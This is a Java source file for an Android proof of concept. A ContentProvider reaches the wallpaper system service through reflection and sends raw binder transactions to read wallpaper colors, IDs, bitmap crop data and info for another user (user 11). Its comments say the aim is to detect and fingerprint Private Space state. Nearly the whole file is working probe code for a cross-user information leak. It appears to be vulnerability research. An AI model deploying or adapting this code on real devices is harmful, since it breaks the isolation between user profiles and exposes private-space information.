package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class WallpaperLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("wallpaper");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no wallpaper binder"});
            return cursor;
        }

        String desc = "android.app.IWallpaperManager";

        // TX mapping from DEX analysis:
        // TX=10: getBitmapCrop(which, userId)
        // TX=11: getWallpaperIdForUser(which, userId)
        // TX=12: getWallpaperInfo(userId)
        // TX=27: getWallpaperColors(which, userId, displayId)

        // Test getWallpaperColors (TX=27) for all user/which/display combinations
        int[] users = {0, 11};
        int[] whichValues = {1, 2}; // FLAG_SYSTEM=1, FLAG_LOCK=2
        int[] displays = {0};

        for (int userId : users) {
            for (int which : whichValues) {
                for (int displayId : displays) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken(desc);
                        data.writeInt(which);
                        data.writeInt(userId);
                        data.writeInt(displayId);
                        binder.transact(27, data, reply, 0);
                        reply.readException();
                        int marker = reply.readInt();
                        if (marker != 0) {
                            // WallpaperColors Parcelable format:
                            // int colorCount + Color[colorCount] + int colorHints
                            // Each Color is written as: long (packed color value)
                            // But actually WallpaperColors writes:
                            // - parcel.writeParcelable(primaryColor) -> Color parcelable
                            // - parcel.writeParcelable(secondaryColor) -> Color or null
                            // - parcel.writeParcelable(tertiaryColor) -> Color or null
                            // - parcel.writeInt(colorHints)
                            // Actually on Android 12+: writeTypedList(allColors) + writeInt(colorHints)

                            // Let's just read the raw bytes to see what's there
                            int avail = reply.dataAvail();
                            StringBuilder sb = new StringBuilder();
                            sb.append("avail=").append(avail).append(" raw=[");

                            // Read raw ints to extract color data
                            int maxInts = Math.min(avail / 4, 20);
                            for (int i = 0; i < maxInts; i++) {
                                if (reply.dataAvail() >= 4) {
                                    int val = reply.readInt();
                                    sb.append(String.format("0x%08X", val));
                                    if (i < maxInts - 1) sb.append(",");
                                }
                            }
                            sb.append("]");

                            String whichStr = which == 1 ? "sys" : "lock";
                            cursor.addRow(new Object[]{
                                "colors_u" + userId + "_" + whichStr + "_d" + displayId,
                                sb.toString()
                            });
                        } else {
                            String whichStr = which == 1 ? "sys" : "lock";
                            cursor.addRow(new Object[]{
                                "colors_u" + userId + "_" + whichStr + "_d" + displayId,
                                "null (no colors)"
                            });
                        }
                    } catch (SecurityException e) {
                        String whichStr = which == 1 ? "sys" : "lock";
                        cursor.addRow(new Object[]{
                            "colors_u" + userId + "_" + whichStr + "_d" + displayId,
                            "DENIED:" + truncate(e.getMessage())
                        });
                    } catch (Exception e) {
                        String whichStr = which == 1 ? "sys" : "lock";
                        cursor.addRow(new Object[]{
                            "colors_u" + userId + "_" + whichStr + "_d" + displayId,
                            "ERR:" + truncate(e.getMessage())
                        });
                    }
                    data.recycle();
                    reply.recycle();
                }
            }
        }

        // Now try the public API approach to confirm
        try {
            android.app.WallpaperManager wm = android.app.WallpaperManager.getInstance(getContext());
            android.app.WallpaperColors colors = wm.getWallpaperColors(android.app.WallpaperManager.FLAG_SYSTEM);
            if (colors != null) {
                cursor.addRow(new Object[]{"api_colors_sys",
                    "primary=" + String.format("0x%08X", colors.getPrimaryColor().toArgb()) +
                    " hints=" + colors.getColorHints()});
            } else {
                cursor.addRow(new Object[]{"api_colors_sys", "null"});
            }
            colors = wm.getWallpaperColors(android.app.WallpaperManager.FLAG_LOCK);
            if (colors != null) {
                cursor.addRow(new Object[]{"api_colors_lock",
                    "primary=" + String.format("0x%08X", colors.getPrimaryColor().toArgb()) +
                    " hints=" + colors.getColorHints()});
            } else {
                cursor.addRow(new Object[]{"api_colors_lock", "null"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"api_colors", "ERR:" + truncate(e.getMessage())});
        }

        // Test if wallpaper colors change across users — fingerprinting
        // Also test: can we detect when Private Space user has different wallpaper?
        cursor.addRow(new Object[]{"analysis",
            "If u0 and u11 colors differ, we can detect Private Space wallpaper state"});

        // TX=11: getWallpaperIdForUser(which, userId)
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(2); // which=FLAG_SYSTEM
                data.writeInt(userId);
                binder.transact(11, data, reply, 0);
                reply.readException();
                int wallId = reply.readInt();
                cursor.addRow(new Object[]{"wallId_u" + userId, "id=" + wallId});
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"wallId_u" + userId, "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wallId_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=10: getBitmapCrop(which, userId) - test cross-user
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(2); // which
                data.writeInt(userId);
                binder.transact(10, data, reply, 0);
                reply.readException();
                int avail = reply.dataAvail();
                StringBuilder sb = new StringBuilder("avail=").append(avail).append(" [");
                int maxInts = Math.min(avail / 4, 10);
                for (int i = 0; i < maxInts; i++) {
                    if (reply.dataAvail() >= 4) {
                        sb.append(String.format("0x%X", reply.readInt()));
                        if (i < maxInts - 1) sb.append(",");
                    }
                }
                sb.append("]");
                cursor.addRow(new Object[]{"bitmapCrop_u" + userId, sb.toString()});
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"bitmapCrop_u" + userId, "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"bitmapCrop_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=12: getWallpaperInfo(userId) - cross-user test
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(12, data, reply, 0);
                reply.readException();
                int marker = reply.readInt();
                if (marker != 0) {
                    cursor.addRow(new Object[]{"wallInfo_u" + userId, "GOT WallpaperInfo parcelable"});
                } else {
                    cursor.addRow(new Object[]{"wallInfo_u" + userId, "null (static wallpaper)"});
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"wallInfo_u" + userId, "DENIED:" + truncate(e.getMessage())});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wallInfo_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        return cursor;
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
